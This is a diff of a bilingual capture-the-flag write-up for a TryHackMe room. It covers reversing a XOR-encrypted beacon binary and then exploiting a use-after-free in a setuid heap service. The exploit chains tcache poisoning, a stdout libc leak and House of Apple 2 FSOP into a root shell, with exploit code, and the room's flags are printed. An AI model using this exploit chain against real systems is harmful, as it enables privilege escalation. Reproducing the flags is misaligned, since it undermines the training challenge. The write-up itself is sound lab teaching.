@@ -1,14 +1,14 @@
-# Scheme-Catcher
+# Advent 2025\SideQuest\Sidequest\Sidequest2\Tutorial\Tutorial_id_root [N/A]
 
 - **Challenge:** beacon.bin (First Stage)  
 - **Category:** Binary Exploitation / Reverse Engineering  
 - **Difficulty:** Insane
 - **URL of  the room:** ![Scheme Catcher](https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R)
 
-## Summary 
+## Resumen / Summary
 
 The actual functionality of the program is concealed by a custom encrypted `.easter` section found in the `beacon.bin` binary. We found a self-decrypting stub that XORs the encrypted code with key `0x0D` using dynamic analysis with GDB. The `payload_load()` function uncovered a hardcoded HTTP path `/7ln6Z1X9EF` built from hex immediates after decryption. This path resulted in a directory listing with the next stage binary and `foothold.txt` (Second flag).
-### Finding the first binary.
+### Encontrando el primer binario. / Finding the first binary.
 **Scanning using nmap**
 ```
 $ nmap -sV -p- 10.48.190.204
@@ -57,20 +57,20 @@ Finished
 ```
 On this directory we found a zip file which is carying our first binary `beacon.bin`
 
-## Initial Reconnaissance
+## Reconocimiento Inicial / Initial Reconnaissance
 
-### File Analysis
+### Análisis de Archivo / File Analysis
 
 ```bash
 file beacon.bin
-# beacon.bin: ELF 64-bit LSB executable, x86-64
+## beacon.bin: ELF 64-bit LSB executable, x86-64
 
 checksec --file=beacon.bin
-# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    No canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x400000)
+## Arch:     amd64-64-little
+## RELRO:    Partial RELRO
+## Stack:    No canary found
+## NX:       NX enabled
+## PIE:      No PIE (0x400000)
 ```
 
 #### Key Observations
@@ -80,7 +80,7 @@ checksec --file=beacon.bin
 - NX enabled (no shellcode on stack)
 - No PIE (static addresses) 
 
-### Static Analysis
+### Análisis Estático / Static Analysis
 
 #### String Enumeration
 
@@ -107,15 +107,15 @@ strings beacon.bin
 
 > **Note:** The disassembly revealed a brief loop that iterated over a memory range from `0x401370` to `0x401bc4` when examining the early code in the `.easter` section. Each byte in this loop was read, XORed with the constant `0x0D`, and then written back to the original location. Execution was then redirected to that area. This pattern is typical of a self-decrypting XOR stub, which means that the actual program logic is encrypted and only decrypted during runtime, just prior to execution.
 
-### GDB Investigation
+### Investigación con GDB / GDB Investigation
 
 ```bash
 gdb beacon.bin
 (gdb) info functions
-# All functions marked <encrypted>
+## All functions marked <encrypted>
 
 (gdb) disas main
-# Showed XOR decryption loop!
+## Showed XOR decryption loop!
 ```
 
 **Decryption Stub Found at 0x804000:**
@@ -153,16 +153,16 @@ Functions are now visible!
 **Key Instructions Found:**
 
 ```assembly
-# Creates socket connection to localhost:80
+## Creates socket connection to localhost:80
 0x4015e2:  call   socket@plt
 0x401619:  call   connect@plt
 
-# Constructs HTTP GET request
+## Constructs HTTP GET request
 0x401648:  movabs rax,0x58315a366e6c372f   # ← SUSPICIOUS HEX
 0x401652:  mov    QWORD PTR [rbp-0x11c],rax
 0x401659:  movl   DWORD PTR [rbp-0x114],0x464539
 
-# Sends HTTP request  
+## Sends HTTP request
 0x401674:  lea    rdx,[rip+0xa75]        # "GET %s HTTP/1.1..."
 0x40167b:  call   snprintf@plt
 ```
@@ -173,12 +173,12 @@ Functions are now visible!
 #!/usr/bin/env python3
 import struct
 
-# First 8-byte immediate
+## First 8-byte immediate
 val1 = 0x58315a366e6c372f
-# Second 4-byte immediate (only 3 bytes used)
+## Second 4-byte immediate (only 3 bytes used)
 val2 = 0x464539
 
-# Convert to little-endian bytes
+## Convert to little-endian bytes
 part1 = struct.pack('<Q', val1)  # b'/7ln6Z1X'
 part2 = struct.pack('<I', val2)[:3]  # b'9EF'
 
@@ -196,7 +196,7 @@ Got the hidden path as `/7ln6Z1X9EF`
 > 
 > Looking for writes to `rbp-0x11c` in reverse, the `movabs` instruction was located at `0x401648`.
 
-### Accessing the Hidden Directory
+### Accediendo al Directorio Oculto / Accessing the Hidden Directory
 
 ```bash
 curl http://10.48.190.204/7ln6Z1X9EF/
@@ -214,10 +214,10 @@ Index of /7ln6Z1X9EF
 
 ```bash
 curl http://10.48.190.204/7ln6Z1X9EF/foothold.txt
-# THM{beacon_analysis_complete_on_to_stage2}
+## THM{beacon_analysis_complete_on_to_stage2}
 ```
 
-## Tools Used
+## Herramientas Utilizadas / Tools Used
 
 - **file** - Binary identification
 - **checksec** - Security feature enumeration
@@ -227,16 +227,13 @@ curl http://10.48.190.204/7ln6Z1X9EF/foothold.txt
 - **objdump** - Disassembly
 ---
 
-
-## Scheme-Catcher Part 2
+## Scheme-Catcher Parte 2 / Scheme-Catcher Part 2
 
 ---
 - **Challenge:** server.bin (Second Stage)  
 - **Category:** Binary Exploitation / Reverse Engineering  
 - **Difficulty:** Insane
 - **URL of  the room:** ![Scheme Catcher](https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R)
-
-
 
 **Flags Captured:**
 - User Flag: `THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}`
@@ -251,9 +248,9 @@ curl http://10.48.190.204/7ln6Z1X9EF/foothold.txt
 
 ---
 
-## Vulnerability Analysis
+## Análisis de Vulnerabilidad / Vulnerability Analysis
 
-### The Target Binary
+### El Binario Objetivo / The Target Binary
 
 The `server` binary implements a heap management service with three operations:
 
@@ -265,7 +262,7 @@ Main Menu:
   4. exit              - Quit
 ```
 
-### Critical Vulnerability: Use-After-Free (UAF)
+### Vulnerabilidad Crítica: Use-After-Free (UAF) / Critical Vulnerability: Use-After-Free (UAF)
 
 **Vulnerability Pattern:**
 
@@ -300,22 +297,22 @@ void update(int index, char* data, int offset) {
 
 ---
 
-## Exploitation Phase 1: Heap Exploit
+## Fase 1 de Explotación: Explotación de Heap / Exploitation Phase 1: Heap Exploit
 
-### Step 1: Heap Grooming
+### Paso 1: Preparación del Heap (Heap Grooming) / Step 1: Heap Grooming
 
 The exploit carefully arranges heap chunks to enable controlled corruption:
 
 ```python
-# Fill tcache with 0x90-sized chunks (max 7 per bin)
+## Fill tcache with 0x90-sized chunks (max 7 per bin)
 for _ in range(7):
     create(0x90 - 8)
 
-# Create "playground" chunk - large enough to corrupt many structures
+## Create "playground" chunk - large enough to corrupt many structures
 middle = create(0x90 - 8)           # Will go to unsorted bin
 playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
 
-# Create guards to prevent consolidation
+## Create guards to prevent consolidation
 guard = create(0x18)
 delete(playground)  # TRIGGER UAF
 guard = create(0x18)
@@ -334,22 +331,22 @@ Top Chunk:
 [available for allocation]
 ```
 
-### Step 2: Tcache Poisoning
+### Paso 2: Envenenamiento de Tcache / Step 2: Tcache Poisoning
 
 After deleting the playground, we exploit UAF to corrupt the `tcache_perthread_struct`:
 
 ```python
-# The playground chunk is now free but we can still write to it
+## The playground chunk is now free but we can still write to it
 update(playground, p64(0x651), 0x18)  # Overwrite freed chunk's size
 
-# Create fake chunks to poison tcache bins
+## Create fake chunks to poison tcache bins
 fake_size_lsb = create(0x3d8)
 fake_size_msb = create(0x3e8)
 delete(fake_size_lsb)
 delete(fake_size_msb)
 
-# Result: We've corrupted tcache_perthread_struct to create
-# a fake 0x10001-sized chunk in the middle of the heap!
+## Result: We've corrupted tcache_perthread_struct to create
+## a fake 0x10001-sized chunk in the middle of the heap!
 ```
 
 **Memory Corruption Result:**
@@ -366,19 +363,19 @@ tcache_perthread_struct (after UAF):
 └─ [Fake 0x10001 chunk created] ← Can allocate arbitrary sizes!
 ```
 
-### Step 3: stdout Hijacking via Tcache Poisoning
+### Paso 3: Secuestro de stdout mediante Envenenamiento de Tcache / Step 3: stdout Hijacking via Tcache Poisoning
 
 Now we poison the tcache to point to the stdout structure in libc:
 
 ```python
-# Manipulate 0x31 tcache bin to point to stdout
+## Manipulate 0x31 tcache bin to point to stdout
 update(win, p16(stdout_lsb), 8)
 
-# Allocate - we get a pointer inside stdout!
+## Allocate - we get a pointer inside stdout!
 stdout_chunk = create(0x28)
 
-# stdout is now in our heap at chunks[stdout_chunk]
-# We can modify the FILE structure!
+## stdout is now in our heap at chunks[stdout_chunk]
+## We can modify the FILE structure!
 ```
 
 **Result:**
@@ -395,21 +392,21 @@ Heap Layout:
 
 ---
 
-## Exploitation Phase 2: FSOP & RCE
+## Fase 2 de Explotación: FSOP y RCE / Exploitation Phase 2: FSOP & RCE
 
-### Step 1: Libc Leak via stdout Corruption
+### Paso 1: Fuga de Libc mediante Corrupción de stdout / Step 1: Libc Leak via stdout Corruption
 
 The FILE structure has a special magic value that forces libc to leak memory:
 
 ```python
-# Overwrite stdout's flags with magic value
+## Overwrite stdout's flags with magic value
 leak_payload = p64(0xfbad3887)  # Special FILE flags
 leak_payload += p64(0) * 3       # Clear read pointers
 leak_payload += p8(0)            # Trigger flush
 
 update(stdout_chunk, leak_payload)
 
-# When the program prints, it leaks a pointer!
+## When the program prints, it leaks a pointer!
 libc_leak = u64(r.recv(8))
 libc.address = libc_leak - (stdout_off + 132)
 ```
@@ -425,7 +422,7 @@ if (file->_flags & 0xfbad0000) {  // Magic check
 }
 ```
 
-### Step 2: House of Apple 2 - FSOP RCE
+### Paso 2: House of Apple 2 - FSOP RCE / Step 2: House of Apple 2 - FSOP RCE
 
 **What is FSOP (File Stream Oriented Programming)?**
 
@@ -450,7 +447,7 @@ from io_file import IO_FILE_plus_struct
 
 file = IO_FILE_plus_struct()
 
-# Build fake FILE structure
+## Build fake FILE structure
 payload = file.house_of_apple2_execmd_when_do_IO_operation(
     stdout_addr,        # Address of _IO_2_1_stdout_
     wfile_jumps_addr,   # Fake vtable address
@@ -458,11 +455,11 @@ payload = file.house_of_apple2_execmd_when_do_IO_operation(
     cmd="sh"            # Command to execute
 )
 
-# The payload sets up:
-# - _flags with embedded command
-# - _IO_write_ptr > _IO_write_base (triggers flush)
-# - vtable → _IO_wfile_jumps (hijacked)
-# - Necessary fields for glibc checks
+## The payload sets up:
+## - _flags with embedded command
+## - _IO_write_ptr > _IO_write_base (triggers flush)
+## - vtable → _IO_wfile_jumps (hijacked)
+## - Necessary fields for glibc checks
 ```
 
 **Payload Structure (232 bytes):**
@@ -481,27 +478,27 @@ Offset  Field               Value
 0xd8    vtable              0x[_IO_wfile_jumps] ← HIJACKED!
 ```
 
-### Step 3: Trigger RCE
+### Paso 3: Disparar la RCE / Step 3: Trigger RCE
 
 ```python
-# Point tcache bin 60 to stdout
-# Bin 60 size = 60*0x10 + 0x50 = 0x3f0
+## Point tcache bin 60 to stdout
+## Bin 60 size = 60*0x10 + 0x50 = 0x3f0
 update(win, p64(stdout_addr), 8*60)
 
-# Allocate from poisoned bin
+## Allocate from poisoned bin
 full_stdout = create(0x3f0 - 8)
 
-# Overwrite stdout with our payload
+## Overwrite stdout with our payload
 update(full_stdout, payload)
 
-# Any stdout operation now triggers:
-# system("sh")
+## Any stdout operation now triggers:
+## system("sh")
 r.interactive()  # Shell!
 ```
 
 ---
 
-## Post-Exploitation: Finding root.txt and user.txt
+## Post-Explotación: Encontrando root.txt y user.txt / Post-Exploitation: Finding root.txt and user.txt
 
 When the exploit succeeds:
 
@@ -545,17 +542,17 @@ uid=0(root) gid=0(root) groups=0(root)
 
 $ whoami
 root
-# The server was alredy running with root privilages. 
+## The server was alredy running with root privilages.
 
 ```
 
-### Extracting the Flag
+### Extrayendo la Flag / Extracting the Flag
 
 **User.txt:**
 
 ```bash
 cat user.txt
-# THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
+## THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
 ```
 
 **Root.txt (after mounting host filesystem):**
@@ -573,7 +570,7 @@ cat user.txt
    THM{final-boss_defeat3d-yay}
 
 ```
-### Visualization
+### Visualización / Visualization
 ```
 BEFORE MOUNT
 ────────────────────────────────────────────────────────
@@ -585,7 +582,6 @@ BEFORE MOUNT
    │   └── root.txt   ✓     │  BLOCK │   └── (empty)     ✗    │
    │                        │        │                        │
    └────────────────────────┘        └────────────────────────┘
-
 
 AFTER MOUNT
 ────────────────────────────────────────────────────────
@@ -601,24 +597,24 @@ AFTER MOUNT
 
 ---
 
-## Complete Exploit Script
+## Script de Exploit Completo / Complete Exploit Script
 
 ```python
 #!/usr/bin/env python3
-# ============================================================
-#  Advanced Heap Exploitation Exploit
-#  Target  : ./server (Setuid Root Binary)
-#  Method  : UAF + Tcache Poisoning + FSOP (House of Apple 2)
-#  Status  : ✅ Fully Working
-# ============================================================
+## ============================================================
+## Advanced Heap Exploitation Exploit
+## Target  : ./server (Setuid Root Binary)
+## Method  : UAF + Tcache Poisoning + FSOP (House of Apple 2)
+## Status  : ✅ Fully Working
+## ============================================================
 
 from pwn import *
 import io_file
 import time
 
-# -------------------------
-# Banner
-# -------------------------
+## -------------------------
+## Banner
+## -------------------------
 BANNER = r"""
 ╔════════════════════════════════════════════════════════════╗
 ║                                                            ║
@@ -636,9 +632,9 @@ BANNER = r"""
 
 print(BANNER)
 
-# -------------------------
-# Context
-# -------------------------
+## -------------------------
+## Context
+## -------------------------
 context.update(arch="amd64", os="linux", log_level="debug")
 context.binary = elf = ELF("./server", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
@@ -651,9 +647,9 @@ log.info(f"[*] Libc: ./libc.so.6")
 log.info(f"[*] Exit offset: {hex(exit_off)}")
 log.info(f"[*] Stdout offset: {hex(stdout_off)}")
 
-# ============================================================
-# EXPLOITATION LOOP
-# ============================================================
+## ============================================================
+## EXPLOITATION LOOP
+## ============================================================
 
 for heap_brute in range(16):
     for libc_brute in range(16):
@@ -822,7 +818,7 @@ log.info("\n[!] All attempts exhausted. Exploit failed.")
 ```
 **Note:** _This script might fail few times. So try to run this script on multiple terminals._
 
-## Credits
+## Créditos / Credits
 
 - **FSOP Implementation:** This exploit uses `io_file.py` from 
   [RoderickChan/pwncli](https://github.com/RoderickChan/pwncli/blob/main/pwncli/utils/io_file.py)
@@ -830,34 +826,34 @@ log.info("\n[!] All attempts exhausted. Exploit failed.")
 
 ---
 
-## Key Learnings
+## Aprendizajes Clave / Key Learnings
 
-### 1. **UAF Vulnerability Chaining**
+### 1. **Encadenamiento de Vulnerabilidades UAF / UAF Vulnerability Chaining**
 
 - A single UAF can corrupt multiple heap structures
 - Tcache poisoning enables arbitrary allocations
 - Combining multiple corruptions creates powerful primitives
 
-### 2. **FSOP (File Stream Oriented Programming)**
+### 2. **FSOP (Programación Orientada a Flujos de Archivos / File Stream Oriented Programming)**
 
 - FILE structures are valid ROP gadget chains
 - The libc `_IO_*` structures have function pointers (vtables)
 - Overwriting vtable pointers redirects execution
 
-### 3. **ASLR Bypass Techniques**
+### 3. **Técnicas de Bypass de ASLR / ASLR Bypass Techniques**
 
 - Libc address can be leaked via stdout manipulation
 - Once one libc address is known, entire libc base is calculated
 - Combined with heap spray, enables reliable exploitation
 
-### 4. **Privilege Escalation**
+### 4. **Escalada de Privilegios / Privilege Escalation**
 
 - Setuid binaries running with elevated privileges
 - Exploiting memory corruption → arbitrary code execution → privilege inheritance
 - Root shell obtained immediately after RCE
 
 ---
-## Infographics
+## Infografías / Infographics
 ![](unnamed.png)
 **Previous:** [Scheme-Catcher.md](README.md)
 
